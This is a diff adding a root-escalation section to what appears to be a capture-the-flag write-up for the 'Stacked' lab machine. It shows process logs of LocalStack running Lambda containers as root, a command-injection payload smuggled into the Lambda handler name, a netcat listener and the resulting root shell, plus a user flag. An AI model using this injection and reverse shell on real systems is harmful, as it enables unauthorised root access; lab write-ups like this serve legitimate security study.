@@ -354,6 +354,45 @@ c877918fc5f7cb38e0631f7849c20b1b
 
 # Root
 
+
+````
+2022/03/22 12:36:13 CMD: UID=0    PID=1107   | unzip -o -q /tmp/localstack/zipfile.974bbfea/original_lambda_archive.zip 
+2022/03/22 12:37:08 CMD: UID=0    PID=1112   | docker create -i -e DOCKER_LAMBDA_USE_STDIN=1 -e LOCALSTACK_HOSTNAME=172.17.0.2 -e EDGE_PORT=4566 -e _HANDLER=index.handler -e AWS_LAMBDA_FUNCTION_TIMEOUT=3 -e AWS_LAMBDA_FUNCTION_NAME=ex -e AWS_LAMBDA_FUNCTION_VERSION=$LATEST -e AWS_LAMBDA_FUNCTION_INVOKED_ARN=arn:aws:lambda:us-east-1:000000000000:function:ex -e AWS_LAMBDA_COGNITO_IDENTITY={} -e NODE_TLS_REJECT_UNAUTHORIZED=0 --rm lambci/lambda:nodejs12.x index.handler                                                                                              
+2022/03/22 12:37:08 CMD: UID=0    PID=1111   | /bin/sh -c CONTAINER_ID="$(docker create -i   -e DOCKER_LAMBDA_USE_STDIN="$DOCKER_LAMBDA_USE_STDIN" -e LOCALSTACK_HOSTNAME="$LOCALSTACK_HOSTNAME" -e EDGE_PORT="$EDGE_PORT" -e _HANDLER="$_HANDLER" -e AWS_LAMBDA_FUNCTION_TIMEOUT="$AWS_LAMBDA_FUNCTION_TIMEOUT" -e AWS_LAMBDA_FUNCTION_NAME="$AWS_LAMBDA_FUNCTION_NAME" -e AWS_LAMBDA_FUNCTION_VERSION="$AWS_LAMBDA_FUNCTION_VERSION" -e AWS_LAMBDA_FUNCTION_INVOKED_ARN="$AWS_LAMBDA_FUNCTION_INVOKED_ARN" -e AWS_LAMBDA_COGNITO_IDENTITY="$AWS_LAMBDA_COGNITO_IDENTITY" -e NODE_TLS_REJECT_UNAUTHORIZED="$NODE_TLS_REJECT_UNAUTHORIZED"   --rm "lambci/lambda:nodejs12.x" "index.handler")";docker cp "/tmp/localstack/zipfile.974bbfea/." "$CONTAINER_ID:/var/task"; docker start -ai "$CONTAINER_ID";                                                                    
+2022/03/22 12:37:08 CMD: UID=0    PID=1118   | docker cp /tmp/localstack/zipfile.974bbfea/. d1fee418bbb519279d0d7301d7c033a642af9326d655d2f4384b410656a69323:/var/task
+````
+
+common line when invoking a aws lambda function
+````
+docker create -i --rm "lambci/lambda:nodejs12.x" "index.handler"
+````
+
+Tests for OS injection in 'index.handler' shows it is vulnerable. We can perform a privesc as the uid that runs the docker is 0.
+````
+$ nc -nlvp 1337
+````
+
+````
+$ aws lambda create-function --function-name shell --handler 'index.handler;$(bash /tmp/blah.sh)' --zip-file fileb://index.zip --role arn:aws:iam::123456789012:role/lambda-role --endpoint-url http://s3-testing.stacked.htb --runtime nodejs12.x
+````
+
+````
+$ aws lambda invoke --function-name shell --endpoint-url http://s3-testing.stacked.htb out.json
+````
+
+````
+$ nc -nlvp 1337
+listening on [any] 1337 ...
+connect to [10.10.15.6] from (UNKNOWN) [10.10.11.112] 60000
+bash: cannot set terminal process group (1156): Not a tty
+bash: no job control in this shell
+bash-5.0# id
+id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+bash-5.0# 
+````
+
+
 # Secrets
 * FLAG_USER = c877918fc5f7cb38e0631f7849c20b1b
 * FLAG_ROOT = 
